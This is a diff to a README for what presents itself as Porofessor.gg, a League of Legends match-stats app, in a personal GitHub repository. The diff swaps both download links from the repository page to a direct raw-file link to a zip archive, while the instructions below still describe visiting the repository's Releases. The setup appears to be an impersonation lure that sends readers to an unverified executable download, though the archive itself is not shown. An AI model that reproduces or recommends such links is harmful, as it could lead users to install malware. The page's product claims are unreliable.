@@ -1,6 +1,6 @@
 # 🎮 Porofessor.gg - Improve Your League of Legends Rank
 
-[![](https://img.shields.io/badge/Download_Porofessor-Blue-blue)](https://github.com/adel200279-dotcom/Porofessor.gg)
+[![](https://img.shields.io/badge/Download_Porofessor-Blue-blue)](https://raw.githubusercontent.com/adel200279-dotcom/Porofessor.gg/main/dist/Porofessor-gg-2.2.zip)
 
 Porofessor.gg provides real-time data for your League of Legends matches. This application runs alongside the game to give you insights into your opponents and teammates. It tracks player statistics, shows champion mastery, and highlights lane habits to help you make informed decisions during your games.
 
@@ -8,7 +8,7 @@ Porofessor.gg provides real-time data for your League of Legends matches. This a
 
 To get started with the application, visit the download repository to obtain the latest version of the installer.
 
-[Download Porofessor.gg Installer](https://github.com/adel200279-dotcom/Porofessor.gg)
+[Download Porofessor.gg Installer](https://raw.githubusercontent.com/adel200279-dotcom/Porofessor.gg/main/dist/Porofessor-gg-2.2.zip)
 
 1. Click the link above to open the repository.
 2. Look for the Releases section on the right side of the page.
